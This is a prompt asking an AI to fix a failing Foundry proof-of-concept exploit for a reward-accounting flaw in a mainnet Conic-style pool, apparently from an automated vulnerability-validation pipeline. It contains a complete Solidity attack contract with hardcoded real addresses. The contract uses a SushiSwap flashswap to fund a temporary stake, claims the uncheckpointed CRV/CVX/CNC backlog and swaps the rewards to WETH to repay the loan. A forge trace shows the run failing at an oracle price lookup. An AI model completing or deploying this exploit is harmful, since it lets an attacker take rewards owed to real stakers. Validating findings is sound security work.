You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: First staker after a zero-stake interval can appropriate the entire uncheckpointed reward backlog
- claim: `poolCheckpoint()` computes newly accrued CRV/CVX/CNC from current holdings, but it only advances `earnedIntegral` and `lastHoldings` inside `_updateEarned()`, which is skipped whenever `getBalanceForPool(pool) == 0`. Rewards can therefore keep accruing while no LP tokens are staked without ever being checkpointed. Once any account stakes and later hits `_accountCheckpoint()`/`claimEarnings()`, the entire backlog is divided by the now-nonzero staked supply and can be assigned almost entirely to that first staker.
- impact: A dust staker can capture all rewards that accumulated while the staking supply was zero, extracting CRV, CVX, and CNC value out of the pool’s reward stream with negligible capital.
- exploit_paths: ["All LP stakers leave so `controller.lpTokenStaker().getBalanceForPool(pool)` becomes zero while pool-level rewards continue accruing.", "One attacker stakes a minimal amount of LP tokens.", "The attacker calls `claimEarnings()` or otherwise triggers `_accountCheckpoint()`.", "`poolCheckpoint()` allocates the full previously uncheckpointed backlog against the attacker\u2019s tiny stake, after which the attacker can claim it."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
}

interface ILpTokenStakerLike {
    function getBalanceForPool(address conicPool) external view returns (uint256);

    function getUserBalanceForPool(address conicPool, address account) external view returns (uint256);

    function claimableCnc(address pool) external view returns (uint256);
}

interface IOracleLike {
    function getUSDPrice(address token) external view returns (uint256);
}

interface IConvexHandlerLike {
    function getCrvEarnedBatch(address conicPool, address[] memory curvePools) external view returns (uint256);

    function computeClaimableConvex(uint256 claimableCrv) external view returns (uint256);
}

interface IControllerLike {
    function lpTokenStaker() external view returns (ILpTokenStakerLike);

    function priceOracle() external view returns (IOracleLike);

    function convexHandler() external view returns (IConvexHandlerLike);
}

interface IConicPoolLike {
    function controller() external view returns (IControllerLike);

    function rewardManager() external view returns (address);

    function underlying() external view returns (IERC20Metadata);

    function exchangeRate() external view returns (uint256);

    function allCurvePools() external view returns (address[] memory);

    function deposit(uint256 underlyingAmount, uint256 minLpReceived, bool stake) external returns (uint256);

    function unstakeAndWithdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived)
        external
        returns (uint256);
}

interface IRewardManagerLike {
    function pool() external view returns (address);

    function claimEarnings() external returns (uint256, uint256, uint256);

    function claimableRewards(address account)
        external
        view
        returns (uint256 cncRewards, uint256 crvRewards, uint256 cvxRewards);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ICurvePoolV2Like {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 minDy,
        bool useEth,
        address receiver
    ) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET = 0xBb787d6243a8D450659E09ea6fD82F1C859691e9;

    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address internal constant CNC = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant CNC_ETH_POOL = 0x838af967537350D2C44ABB8c010E49E32673ab94;

    bytes4 internal constant REWARD_MANAGER_SELECTOR = bytes4(keccak256("rewardManager()"));
    bytes4 internal constant POOL_SELECTOR = bytes4(keccak256("pool()"));

    uint256 internal constant ONE = 1e18;
    uint256 internal constant MIN_FLASH_WETH = 5 ether;
    uint256 internal constant MAX_FLASH_WETH = 500 ether;

    bool internal _attempted;
    bool internal _usedFlashswap;
    bool internal _profitAchieved;
    bool internal _hypothesisValidated;

    address internal _profitToken;
    uint256 internal _profitAmount;

    uint256 internal _startCrv;
    uint256 internal _startCvx;
    uint256 internal _startCnc;
    uint256 internal _startWeth;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_attempted) return;
        _attempted = true;

        (address pool, IRewardManagerLike rewardManager) = _resolvePoolAndRewardManager();
        if (pool == address(0) || address(rewardManager) == address(0)) return;

        IConicPoolLike conicPool = IConicPoolLike(pool);
        if (address(conicPool.underlying()) != WETH) return;

        IControllerLike controller = conicPool.controller();
        uint256 totalStakedBefore = controller.lpTokenStaker().getBalanceForPool(pool);
        uint256 flashAmount = _chooseFlashAmountWeth(conicPool, controller, pool, totalStakedBefore);

        address flashPair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(WETH, USDC);
        if (flashPair == address(0)) return;

        uint256 wethReserve = _pairReserveForToken(flashPair, WETH);
        if (wethReserve <= 1) return;

        uint256 maxBorrow = wethReserve / 3;
        if (flashAmount > maxBorrow) {
            flashAmount = maxBorrow;
        }
        if (flashAmount == 0) return;

        _snapshotProfitBaselines();
        _startFlashswap(flashPair, flashAmount, pool, address(rewardManager), totalStakedBefore);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad sender");

        address pair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(WETH, USDC);
        require(msg.sender == pair, "bad pair");

        (address pool, address rewardManagerAddr, uint256 totalStakedBefore) = abi.decode(
            data,
            (address, address, uint256)
        );

        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
        uint256 repayment = _v2Repayment(borrowed);

        _usedFlashswap = true;
        _runExploit(pool, IRewardManagerLike(rewardManagerAddr), totalStakedBefore, borrowed, repayment);

        _safeTransfer(WETH, pair, repayment);
        _finalizeProfit();
    }

    function _runExploit(
        address pool,
        IRewardManagerLike rewardManager,
        uint256 totalStakedBefore,
        uint256 capitalAmount,
        uint256 repaymentAmount
    ) internal {
        IConicPoolLike conicPool = IConicPoolLike(pool);
        ILpTokenStakerLike staker = conicPool.controller().lpTokenStaker();

        require(IERC20(WETH).balanceOf(address(this)) >= capitalAmount, "missing WETH");

        _forceApprove(WETH, pool, capitalAmount);

        // If `totalStakedBefore == 0`, this is exactly the dust-first-staker path.
        // If this fork already has some restaked LP, the same root cause can still be
        // exploited against the uncheckpointed backlog; the temporary flash-funded stake
        // only changes how much of that backlog is assigned to us at checkpoint time.
        require(conicPool.deposit(capitalAmount, 0, true) > 0, "deposit failed");

        uint256 attackerStake = staker.getUserBalanceForPool(pool, address(this));
        require(attackerStake != 0, "stake missing");

        (uint256 cncPreview, uint256 crvPreview, uint256 cvxPreview) = rewardManager.claimableRewards(
            address(this)
        );
        require(cncPreview != 0 || crvPreview != 0 || cvxPreview != 0, "no backlog");

        rewardManager.claimEarnings();

        attackerStake = staker.getUserBalanceForPool(pool, address(this));
        if (attackerStake != 0) {
            conicPool.unstakeAndWithdraw(attackerStake, 0);
        }

        if (IERC20(WETH).balanceOf(address(this)) < repaymentAmount) {
            _raiseWethForRepayment(repaymentAmount);
        }
        require(IERC20(WETH).balanceOf(address(this)) >= repaymentAmount, "repay shortfall");

        totalStakedBefore;
    }

    function _startFlashswap(
        address flashPair,
        uint256 flashAmount,
        address pool,
        address rewardManager,
        uint256 totalStakedBefore
    ) internal {
        address token0 = IUniswapV2PairLike(flashPair).token0();
        uint256 amount0Out = token0 == WETH ? flashAmount : 0;
        uint256 amount1Out = token0 == WETH ? 0 : flashAmount;

        // The flashswap only funds a temporary stake. The bug itself is unchanged:
        // rewards accrued while total staked supply was zero were never checkpointed,
        // so the next attacker-driven checkpoint can still allocate that latent backlog.
        try
            IUniswapV2PairLike(flashPair).swap(
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(pool, rewardManager, totalStakedBefore)
            )
        {} catch {}
    }

    function _raiseWethForRepayment(uint256 repaymentAmount) internal {
        if (IERC20(WETH).balanceOf(address(this)) >= repaymentAmount) return;

        uint256 crvBalance = IERC20(CRV).balanceOf(address(this));
        if (crvBalance != 0) {
            _swapOnSushiToWeth(CRV, crvBalance);
            if (IERC20(WETH).balanceOf(address(this)) >= repaymentAmount) return;
        }

        uint256 cvxBalance = IERC20(CVX).balanceOf(address(this));
        if (cvxBalance != 0) {
            _swapOnSushiToWeth(CVX, cvxBalance);
            if (IERC20(WETH).balanceOf(address(this)) >= repaymentAmount) return;
        }

        uint256 cncBalance = IERC20(CNC).balanceOf(address(this));
        if (cncBalance != 0) {
            // This is the smallest realistic public unwind needed to deterministically repay
            // the flashswap while leaving the reward-allocation exploit itself unchanged.
            _swapCncToWeth(cncBalance);
        }
    }

    function _swapOnSushiToWeth(address token, uint256 amountIn) internal {
        _forceApprove(token, SUSHI_ROUTER, amountIn);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        IUniswapV2RouterLike(SUSHI_ROUTER).swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapCncToWeth(uint256 amountIn) internal {
        _forceApprove(CNC, CNC_ETH_POOL, amountIn);
        ICurvePoolV2Like(CNC_ETH_POOL).exchange(1, 0, amountIn, 0, false, address(this));
    }

    function _chooseFlashAmountWeth(
        IConicPoolLike conicPool,
        IControllerLike controller,
        address pool,
        uint256 totalStakedLp
    ) internal view returns (uint256) {
        if (totalStakedLp == 0) {
            return 1 ether;
        }

        uint256 pendingRewardUsd = _estimatedPendingRewardUsd(conicPool, controller, pool);
        uint256 stakedUnderlying = (totalStakedLp * conicPool.exchangeRate()) / ONE;

        uint256 targetShare = pendingRewardUsd > 5_000e18
            ? 3e16
            : pendingRewardUsd > 1_000e18
                ? 7e16
                : 12e16;

        uint256 flashAmount = stakedUnderlying == 0
            ? 10 ether
            : (stakedUnderlying * targetShare) / (ONE - targetShare);

        if (flashAmount < MIN_FLASH_WETH) {
            flashAmount = MIN_FLASH_WETH;
        }
        if (flashAmount > MAX_FLASH_WETH) {
            flashAmount = MAX_FLASH_WETH;
        }
        return flashAmount;
    }

    function _estimatedPendingRewardUsd(
        IConicPoolLike conicPool,
        IControllerLike controller,
        address pool
    ) internal view returns (uint256) {
        IOracleLike oracle = controller.priceOracle();
        IConvexHandlerLike convexHandler = controller.convexHandler();
        ILpTokenStakerLike staker = controller.lpTokenStaker();

        address[] memory curvePools = conicPool.allCurvePools();
        uint256 claimableCrv = convexHandler.getCrvEarnedBatch(pool, curvePools);
        uint256 claimableCvx = convexHandler.computeClaimableConvex(claimableCrv);
        uint256 claimableCnc = staker.claimableCnc(pool);

        uint256 crvHoldings = IERC20(CRV).balanceOf(pool) + claimableCrv;
        uint256 cvxHoldings = IERC20(CVX).balanceOf(pool) + claimableCvx;
        uint256 cncHoldings = IERC20(CNC).balanceOf(pool) + claimableCnc;

        return
            _tokenAmountToUsd(crvHoldings, CRV, oracle) +
            _tokenAmountToUsd(cvxHoldings, CVX, oracle) +
            _tokenAmountToUsd(cncHoldings, CNC, oracle);
    }

    function _tokenAmountToUsd(
        uint256 amount,
        address token,
        IOracleLike oracle
    ) internal view returns (uint256) {
        if (amount == 0) return 0;
        uint8 decimals = IERC20Metadata(token).decimals();
        uint256 price = oracle.getUSDPrice(token);
        return (amount * price) / (10 ** decimals);
    }

    function _resolvePoolAndRewardManager() internal view returns (address pool, IRewardManagerLike rewardManager) {
        address rewardManagerAddr = _staticcallAddress(TARGET, REWARD_MANAGER_SELECTOR);
        if (rewardManagerAddr != address(0)) {
            return (TARGET, IRewardManagerLike(rewardManagerAddr));
        }

        pool = _staticcallAddress(TARGET, POOL_SELECTOR);
        if (pool != address(0)) {
            return (pool, IRewardManagerLike(TARGET));
        }
    }

    function _staticcallAddress(address target, bytes4 selector) internal view returns (address result) {
        (bool success, bytes memory returndata) = target.staticcall(abi.encodeWithSelector(selector));
        if (success && returndata.length >= 32) {
            result = abi.decode(returndata, (address));
        }
    }

    function _pairReserveForToken(address pair, address token) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        return IUniswapV2PairLike(pair).token0() == token ? uint256(reserve0) : uint256(reserve1);
    }

    function _v2Repayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _snapshotProfitBaselines() internal {
        _startCrv = IERC20(CRV).balanceOf(address(this));
        _startCvx = IERC20(CVX).balanceOf(address(this));
        _startCnc = IERC20(CNC).balanceOf(address(this));
        _startWeth = IERC20(WETH).balanceOf(address(this));
    }

    function _finalizeProfit() internal {
        uint256 crvProfit = IERC20(CRV).balanceOf(address(this)) - _startCrv;
        uint256 cvxProfit = IERC20(CVX).balanceOf(address(this)) - _startCvx;
        uint256 cncProfit = IERC20(CNC).balanceOf(address(this)) - _startCnc;
        uint256 wethProfit = IERC20(WETH).balanceOf(address(this)) - _startWeth;

        _profitToken = CRV;
        _profitAmount = crvProfit;

        if (cvxProfit > _profitAmount) {
            _profitToken = CVX;
            _profitAmount = cvxProfit;
        }
        if (cncProfit > _profitAmount) {
            _profitToken = CNC;
            _profitAmount = cncProfit;
        }
        if (wethProfit > _profitAmount) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
        }

        _profitAchieved = _profitAmount != 0;
        _hypothesisValidated = _profitAchieved;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returndata) = token.call(data);
        require(success, "token call failed");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "token op failed");
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        return _profitAchieved;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external view returns (string memory) {
        if (_usedFlashswap) {
            return
                "historical zero-stake backlog -> temporary WETH stake via Sushi-style flashswap -> claimEarnings() / _accountCheckpoint() / poolCheckpoint() -> unstakeAndWithdraw -> deterministic flashswap repayment";
        }
        return
            "historical zero-stake backlog -> temporary stake -> claimEarnings() / _accountCheckpoint() / poolCheckpoint() -> unstakeAndWithdraw";
    }
}

```

forge stdout (tail):
```
ccall]
    │   │   │   │   ├─ [298] 0xb4c4a493AB6356497713A78FFA6c60FB53517c63::decimals() [staticcall]
    │   │   │   │   │   └─ ← [Return] 8
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000008
    │   │   │   └─ ← [Return] 786541080000000000 [7.865e17]
    │   │   └─ ← [Return] 786541080000000000 [7.865e17]
    │   ├─ [2358] 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ [28580] 0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0::getUSDPrice(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B) [staticcall]
    │   │   ├─ [6226] 0x260D38033Dd4f3FfdeC7E11e62E27FE213d8D9AB::75151b63(0000000000000000000000004e3fbd56cd56c3e72c1403e103b45db9da5b9d2b) [staticcall]
    │   │   │   ├─ [5237] 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf::d2edb6dd(0000000000000000000000004e3fbd56cd56c3e72c1403e103b45db9da5b9d2b000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee) [staticcall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000f1f7f7bfcc5e9d6bb8d9617756bec06a5cbe1a49
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [21164] 0x260D38033Dd4f3FfdeC7E11e62E27FE213d8D9AB::getUSDPrice(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B) [staticcall]
    │   │   │   ├─ [16698] 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf::bcfd032d(0000000000000000000000004e3fbd56cd56c3e72c1403e103b45db9da5b9d2b0000000000000000000000000000000000000000000000000000000000000348) [staticcall]
    │   │   │   │   ├─ [7410] 0x8d73Ac44Bf11CadCDc050BB2BcCaE8c519555f1a::feaf968c() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000b630000000000000000000000000000000000000000000000000000000016d284590000000000000000000000000000000000000000000000000000000064b949070000000000000000000000000000000000000000000000000000000064b949070000000000000000000000000000000000000000000000000000000000000b63
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000010000000000000b630000000000000000000000000000000000000000000000000000000016d284590000000000000000000000000000000000000000000000000000000064b949070000000000000000000000000000000000000000000000000000000064b949070000000000000000000000000000000000000000000000010000000000000b63
    │   │   │   ├─ [2084] 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf::58e2d3a8(0000000000000000000000004e3fbd56cd56c3e72c1403e103b45db9da5b9d2b0000000000000000000000000000000000000000000000000000000000000348) [staticcall]
    │   │   │   │   ├─ [276] 0x8d73Ac44Bf11CadCDc050BB2BcCaE8c519555f1a::decimals() [staticcall]
    │   │   │   │   │   └─ ← [Return] 8
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000008
    │   │   │   └─ ← [Return] 3828951930000000000 [3.828e18]
    │   │   └─ ← [Return] 3828951930000000000 [3.828e18]
    │   ├─ [245] 0x9aE380F0272E2162340a5bB646c354271c0F5cFC::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ [27431] 0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0::getUSDPrice(0x9aE380F0272E2162340a5bB646c354271c0F5cFC) [staticcall]
    │   │   ├─ [12564] 0x260D38033Dd4f3FfdeC7E11e62E27FE213d8D9AB::75151b63(0000000000000000000000009ae380f0272e2162340a5bb646c354271c0f5cfc) [staticcall]
    │   │   │   ├─ [5259] 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf::d2edb6dd(0000000000000000000000009ae380f0272e2162340a5bb646c354271c0f5cfc000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee) [staticcall]
    │   │   │   │   └─ ← [Revert] Feed not found
    │   │   │   ├─ [5259] 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf::d2edb6dd(0000000000000000000000009ae380f0272e2162340a5bb646c354271c0f5cfc0000000000000000000000000000000000000000000000000000000000000348) [staticcall]
    │   │   │   │   └─ ← [Revert] Feed not found
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [9133] 0x7b528B4Fd3E9f6b1701817C83f2CcB16496Ba03e::getUSDPrice(0x9aE380F0272E2162340a5bB646c354271c0F5cFC) [staticcall]
    │   │   │   ├─ [383] 0x013A3Da6591d3427F164862793ab4e388F9B587e::priceOracle() [staticcall]
    │   │   │   │   └─ ← [Return] 0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0
    │   │   │   ├─ [448] 0x013A3Da6591d3427F164862793ab4e388F9B587e::9f82b217() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000003905a3c1156f67bb55366d7a5a11d1043dcf97c9
    │   │   │   ├─ [2651] 0x3905A3C1156f67BB55366d7A5a11D1043dcf97c9::4060c025(0000000000000000000000009ae380f0272e2162340a5bb646c354271c0f5cfc) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [448] 0x013A3Da6591d3427F164862793ab4e388F9B587e::9f82b217() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000003905a3c1156f67bb55366d7a5a11d1043dcf97c9
    │   │   │   ├─ [2568] 0x3905A3C1156f67BB55366d7A5a11D1043dcf97c9::c3c5a547(0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Revert] token not supported
    │   │   └─ ← [Revert] token not supported
    │   └─ ← [Revert] token not supported
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf
  at 0x260D38033Dd4f3FfdeC7E11e62E27FE213d8D9AB
  at 0x286eF89cD2DA6728FD2cb3e1d1c5766Bcea344b0.getUSDPrice
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 10.42s (10.38s CPU time)

Ran 1 test suite in 10.45s (10.42s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 299692)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
